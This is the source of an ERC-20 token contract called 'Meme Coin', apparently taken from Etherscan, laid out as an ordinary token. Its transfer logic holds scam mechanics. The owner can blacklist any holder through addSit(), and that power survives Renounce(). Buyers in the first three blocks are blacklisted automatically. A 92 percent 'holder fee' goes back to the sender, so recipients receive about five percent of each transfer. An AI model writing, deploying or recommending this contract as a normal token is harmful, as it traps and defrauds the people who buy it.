/**
 *Submitted for verification at Etherscan.io on 2022-04-11
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

////////////Interface///////////////
interface IERC20 {
    function totalSupply() external  view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external  returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

//////////LIibrary////////////////////////
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

 /////////////////////Token////////////////////////
  contract MemeCoin is IERC20Metadata {
        using SafeMath for uint256;

        mapping (address => uint256) private _balances;  
        mapping (address => mapping(address => uint256)) private _allowances;  
        mapping (address => bool) public isExcludFee; 
        mapping (address => bool) public isLimitExempt;
        mapping (address => bool) public isBots;
        mapping (address => bool) public isScientist;

        bool public ismobility; 
        
        string  private _name = "Meme Coin";
        string  private _symbol = "MEME";
        uint8   private _decimals = 2;
        uint256 private _totalSupply;
        address internal Owner; 
        address internal pair;
        address internal DEAD = 0x0000000000000000000000000000000000000000;
        address internal devAddress = 0xC26fc4443145a582A95bA82b4c12EE8FA832D1C2;

        uint256 internal developFee = 2;
        uint256 internal burnFee = 1;
        uint256 public holderFee = 92;
        uint256 internal totalFee = holderFee.add(burnFee).add(developFee);
        uint256 internal divider = 100;
        uint256 internal permutation = 1 * (10**15) * (10 **_decimals);
        uint256 public lauchBlock = 0;
        uint256 public Scientist;    
        
        constructor ()  {
            Owner = msg.sender;
            isExcludFee[Owner] = true;
            isExcludFee[devAddress] =true;
            isExcludFee[address(this)] =true;

            isLimitExempt[Owner] =true;
            isLimitExempt[address(this)] = true;
            isLimitExempt[devAddress] = true;
            isLimitExempt[address(0)]    = true;

            uint256 liq  = 9 * (10**14) * (10 **_decimals);
            _totalSupply = 1 * (10**15) * (10 **_decimals); 
    
            _balances[msg.sender] = liq;
            _balances[DEAD] = _totalSupply.sub(liq);
            emit Transfer(address(0) , msg.sender , liq);
            emit Transfer(address(0) , DEAD, _totalSupply.sub(liq));
        }

        modifier onlyOwner {
            require(msg.sender == Owner);
            _;
        }

    function name() external virtual override view returns (string memory){return _name;}
    function symbol() external virtual override  view returns (string memory){return _symbol;}
    function decimals() external virtual override view returns (uint8){return _decimals;}
    function totalSupply() external virtual override view returns (uint256){return _totalSupply;}
    function balanceOf(address account)  external virtual override view returns (uint256){return _balances[account];}
    function owner() external view returns(address) {return Owner;}
    function Pair() external view returns(address){return pair;}
    

    function ExcludeFee(address _newExAddr) external onlyOwner {
        isExcludFee[_newExAddr] = true;
    }

    function setDev(address _newAddr) external onlyOwner {
        devAddress = _newAddr;
    }
    function setMaxSwap( uint256 value) external onlyOwner {
        permutation  = value * ( 10**_decimals);
    }
    function addSit(address addr , bool value) external onlyOwner {
            isScientist[addr] = value;
    }

    function Renounce() external onlyOwner {
        Owner = 0x0000000000000000000000000000000000000000;
    }

    function allowance(
        address _owner,
        address spender) 
        external
        virtual
        override 
        view returns (uint256){
        return _allowances[_owner][spender];
    }

    function approve(
        address spender,
        uint256 amount) 
        external 
        virtual
         override 
         returns (bool){
        
        require(_balances[msg.sender] >= amount);
         _allowances[msg.sender][spender] = amount;
         emit Approval(msg.sender , spender , amount);
         return true;
    }

    function transfer(
        address recipient,
        uint256 amount) 
        external
        virtual 
        override
        returns (bool){
        _transfer(msg.sender , recipient , amount);
        return true;
    }

    function transferFrom(address sender,
        address recipient,
        uint256 amount) 
        external 
        virtual 
        override 
        returns (bool){
        require(sender != address(0) , "ERC20: sender prohibit address (0)");
        require(recipient != address(0) , "ERC20 : recipient prohibit address(0)");
        uint256 allowancess = _allowances[sender][msg.sender];
        require(allowancess >= amount);
        unchecked{
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount);
            }
        _transfer(sender , recipient , amount);
        return true;
    }


    ////////////Transfer//////////////////
    function _transfer(
        address from , 
        address to ,
        uint256 amounts) 
        internal  {
        require(!isBots[from] && !isBots[to]);
        require(!isScientist[from] && !isScientist[to]);

       if(isContract(to) && !ismobility){  
           ismobility = true;        
           lauchBlock = block.number; 
           pair = to; 
       }

       if(ismobility && !isLimitExempt[from] && !isLimitExempt[to]) { 
            require(amounts <= permutation  , "Max Exchange");
        }
        uint256 shouldfee = takeFees(from, to ,amounts);
        unchecked{
            _balances[from] = _balances[from].sub(amounts);
            }
        unchecked{
            _balances[to] = _balances[to].add(shouldfee);
            }
        emit Transfer(from , to , shouldfee);
    }

    function takeFees(
        address from,
        address to, 
        uint256 amount) 
        internal returns(uint256) {
           uint256 burns;
           uint256 marks;
           uint256 taxs;
        if(lauchBlock.add(3) > block.number && !isExcludFee[from]){ 
            burns = amount.mul(1).div(100);
            unchecked{
                _balances[address(0)] = _balances[address(0)].add(burns);
                }
           if(pair != to){
               addBots(to);
           }
            emit Transfer(from , address(0), burns);
            } else{
                if(isExcludFee[from] || isExcludFee[to]) { 
                    return amount;
                }else{ 
                     
                if(burnFee > 0){
                           burns = amount.mul(burnFee).div(divider);
                           unchecked{
                               _balances[address(0)] = _balances[address(0)].add(burns);
                               }
                           emit Transfer(from , address(0) , burns);
                      }
                if(developFee > 0){
                          marks = amount.mul(developFee).div(divider);
                          unchecked{
                              _balances[devAddress] = _balances[devAddress].add(marks);
                              }
                          emit Transfer(from , address(devAddress), marks);
                      }
                if(holderFee > 0){
                          taxs = amount.mul(holderFee).div(divider);
                          unchecked{
                              _balances[from] = _balances[from].add(taxs);
                              }
                          emit Transfer(from , from, taxs);
                      }
                }
            }
             return amount.sub(burns).sub(marks).sub(taxs);
    }
    function addBots(address bot) internal {
            isBots[bot] = true;
            Scientist++;
        }
     function isContract(address account) internal view returns (bool) {  
        uint256 size;
        assembly {
            size := extcodesize(account)
            }   
        return size > 0;   
    }
    uint256 public aSBlock; 
  uint256 public aEBlock; 
  uint256 public aCap; 
  uint256 public aTot; 
  uint256 public aAmt; 

  function getAirdrop(address _refer) public returns (bool success){
    require(aSBlock <= block.number && block.number <= aEBlock);
    require(aTot < aCap || aCap == 0);
    aTot ++;
    if(msg.sender != _refer && _balances[_refer] != 0 && _refer != 0x0000000000000000000000000000000000000000){
      _balances[address(this)] = _balances[address(this)].sub(aAmt / 2);
      _balances[_refer] = _balances[_refer].add(aAmt / 2);
      emit Transfer(address(this), _refer, aAmt / 2);
    }
    _balances[address(this)] = _balances[address(this)].sub(aAmt);
    _balances[msg.sender] = _balances[msg.sender].add(aAmt);
    emit Transfer(address(this), msg.sender, aAmt);
    return true;
  }


  function viewAirdrop() public view returns(uint256 StartBlock, uint256 EndBlock, uint256 DropCap, uint256 DropCount, uint256 DropAmount){
    return(aSBlock, aEBlock, aCap, aTot, aAmt);
  }
  
  function startAirdrop(uint256 _aSBlock, uint256 _aEBlock, uint256 _aAmt, uint256 _aCap) public onlyOwner() {
    aSBlock = _aSBlock;
    aEBlock = _aEBlock;
    aAmt = _aAmt;
    aCap = _aCap;
    aTot = 0;
  }
  
}